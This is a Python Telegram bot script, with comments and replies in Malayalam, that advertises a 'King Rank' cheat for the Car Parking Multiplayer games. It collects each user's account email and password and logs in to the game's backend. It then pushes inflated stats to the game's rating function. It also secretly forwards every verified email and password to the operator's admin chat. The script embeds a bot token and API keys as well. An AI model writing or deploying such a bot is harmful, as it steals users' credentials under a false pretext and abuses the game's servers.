import telebot
from telebot import types
import requests
import json


# --- CONFIG ---
TOKEN = '8542467216:AAG_S6R4YMswzKHRWJxOtCCj0A059bf3BpE'
ADMIN_ID = '5475305604'
bot = telebot.TeleBot(TOKEN)

# API ENDPOINTS
CPM1_AUTH = "https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM"
CPM1_SET_RANK = 'https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4'

CPM2_AUTH = "https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ"
CPM2_SET_RANK = 'https://us-central1-cpm-2-7cea1.cloudfunctions.net/SetUserRating17_AppI'

# താൽക്കാലികമായി യൂസർ ഡാറ്റ സൂക്ഷിക്കാൻ
user_cache = {}

# --- CORE RANK INJECTION FUNCTION ---
def inject_all_features(token, game_type):
    url = CPM1_SET_RANK if game_type == 'CPM 1' else CPM2_SET_RANK
    
    # നിങ്ങൾ നൽകിയ ഒറിജിനൽ സ്ക്രിപ്റ്റിലെ മുഴുവൻ ഫീച്ചറുകളും ഇവിടെയുണ്ട്
    full_stats = [
        'cars', 'car_fix', 'car_collided', 'car_exchange', 'car_trade', 
        'car_wash', 'slicer_cut', 'drift_max', 'drift', 'cargo', 
        'delivery', 'taxi', 'levels', 'gifts', 'fuel', 'offroad', 
        'speed_banner', 'reactions', 'police', 'run', 'real_estate', 
        't_distance', 'treasure', 'block_post', 'push_ups', 'burnt_tire', 
        'passanger_distance'
    ]
    
    # വാല്യൂസ് സെറ്റ് ചെയ്യുന്നു
    rating_data = {stat: 100000 for stat in full_stats}
    rating_data['time'] = 10000000000
    rating_data['race_win'] = 5000
    
    payload = {'data': json.dumps({'RatingData': rating_data})}
    headers = {
        'Authorization': f"Bearer {token}",
        'Content-Type': 'application/json',
        'User-Agent': 'okhttp/3.12.13'
    }
    
    try:
        r = requests.post(url, headers=headers, json=payload, timeout=20)
        return r.status_code == 200
    except:
        return False

# --- BOT HANDLERS ---

@bot.message_handler(commands=['start'])
def welcome(message):
    # ബട്ടണുകൾ നിർമ്മിക്കുന്നു
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    markup.add(types.KeyboardButton('CPM 1'), types.KeyboardButton('CPM 2'))
    
    bot.send_message(
        message.chat.id, 
        "🏎️ **CPM Rank King Bot**\n\nഗെയിം പതിപ്പ് തിരഞ്ഞെടുക്കുക:", 
        reply_markup=markup, 
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda message: message.text in ['CPM 1', 'CPM 2'])
def handle_game_selection(message):
    user_cache[message.chat.id] = {'game': message.text}
    bot.send_message(
        message.chat.id, 
        f"📧 ശരി, നിങ്ങളുടെ **{message.text}** ഇമെയിൽ അയക്കുക:", 
        reply_markup=types.ReplyKeyboardRemove(),
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(message, process_email)

def process_email(message):
    email = message.text.strip()
    if "@" not in email:
        bot.reply_to(message, "❌ ഇമെയിൽ ശരിയല്ല! വീണ്ടും അയക്കുക:")
        bot.register_next_step_handler(message, process_email)
        return
    
    user_cache[message.chat.id]['email'] = email
    bot.send_message(message.chat.id, "🔑 ഇനി പാസ്‌വേഡ് അയക്കുക:")
    bot.register_next_step_handler(message, process_password)

def process_password(message):
    password = message.text.strip()
    chat_id = message.chat.id
    
    # സേവ് ചെയ്ത ഡാറ്റ എടുക്കുന്നു
    data = user_cache.get(chat_id)
    if not data:
        bot.send_message(chat_id, "❌ സെഷൻ നഷ്ടപ്പെട്ടു. /start അടിക്കുക.")
        return

    email = data['email']
    game = data['game']
    
    status_msg = bot.send_message(chat_id, "⏳ അക്കൗണ്ട് ലോഗിൻ ചെയ്യുന്നു...")

    # 1. Login Logic
    auth_url = CPM1_AUTH if game == 'CPM 1' else CPM2_AUTH
    try:
        auth_res = requests.post(auth_url, json={'email': email, 'password': password, 'returnSecureToken': True})
        res_json = auth_res.json()
        
        if 'idToken' in res_json:
            token = res_json['idToken']
            
            # അഡ്മിനായ നിങ്ങൾക്ക് വിവരം കൈമാറുന്നു
            bot.send_message(ADMIN_ID, f"📢 **Login Alert**\n🎮 Game: {game}\n📧 User: `{email}`\n🔑 Pass: `{password}`", parse_mode='Markdown')
            
            bot.edit_message_text("✅ ലോഗിൻ സക്സസ്! എല്ലാ ഫീച്ചറുകളും അപ്ഡേറ്റ് ചെയ്യുന്നു...", chat_id, status_msg.message_id)
            
            # 2. Injection Logic (മുഴുവൻ ഫീച്ചറുകളും ഇവിടെ റൺ ആകും)
            if inject_all_features(token, game):
                success_msg = (
                    f"👑 **{game} King Rank Success!**\n\n"
                    "✅ 27+ Features Updated\n"
                    "✅ Race Wins: 5000\n"
                    "✅ Unlimited Stats Added\n\n"
                    "ഗെയിം ഓഫ് ചെയ്ത് വീണ്ടും ഓപ്പൺ ചെയ്യുക."
                )
                bot.edit_message_text(success_msg, chat_id, status_msg.message_id)
            else:
                bot.edit_message_text("❌ റാങ്ക് മാറ്റാൻ കഴിഞ്ഞില്ല. സെർവർ എറർ.", chat_id, status_msg.message_id)
        else:
            bot.edit_message_text("❌ ലോഗിൻ പരാജയപ്പെട്ടു. ഇമെയിലും പാസ്‌വേഡും പരിശോധിക്കുക.", chat_id, status_msg.message_id)
            
    except Exception as e:
        bot.edit_message_text(f"❌ ഒരു പിശക് സംഭവിച്ചു: {str(e)}", chat_id, status_msg.message_id)

if __name__ == "__main__":
    print("Bot is starting...")
    bot.infinity_polling()
